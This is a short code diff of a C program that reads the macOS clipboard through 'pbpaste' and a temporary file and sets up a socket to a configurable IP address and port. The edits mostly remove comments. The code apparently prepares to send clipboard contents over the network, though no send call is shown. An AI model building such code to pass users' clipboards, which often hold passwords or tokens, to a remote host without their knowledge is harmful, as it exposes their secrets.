@@ -14,24 +14,24 @@
 #define SIZE sizeof(struct sockaddr_in)
 
 char* get_clipboard_text() {
-    system("pbpaste > tmp.txt");  // pbpaste command puts the clipboard content into tmp.txt
+    system("pbpaste > tmp.txt");
 
-    FILE* file = fopen("tmp.txt", "r"); // Open the temporary file
-    if (!file) return NULL; // If file could not be opened, return NULL
+    FILE* file = fopen("tmp.txt", "r");
+    if (!file) return NULL;
 
     fseek(file, 0, SEEK_END);
-    long length = ftell(file); // Get the length of the file
+    long length = ftell(file);
     fseek(file, 0, SEEK_SET);
 
-    char* buffer = malloc(length + 1); // Allocate a buffer of the appropriate length
+    char* buffer = malloc(length + 1);
     if (buffer) {
-        fread(buffer, 1, length, file); // Read the file into the buffer
-        buffer[length] = '\0'; // Null-terminate the string
+        fread(buffer, 1, length, file);
+        buffer[length] = '\0';
     }
     
-    fclose(file); // Close the file
-    system("rm tmp.txt"); // Remove the temporary file
-    return buffer; // Return the buffer
+    fclose(file);
+    system("rm tmp.txt");
+    return buffer;
 }
 
 int main (int argc, char **argv) {
@@ -48,8 +48,8 @@ int main (int argc, char **argv) {
 
     char *copied_data = NULL;
 
-   /* initialize the internet socket with a port number of 8301
-       and the local address,specified as INADDR_ANY */
+   /* initialize the internet socket with a port number of `port`
+       and the address specified in ip_address */
     struct sockaddr_in server;
 
 
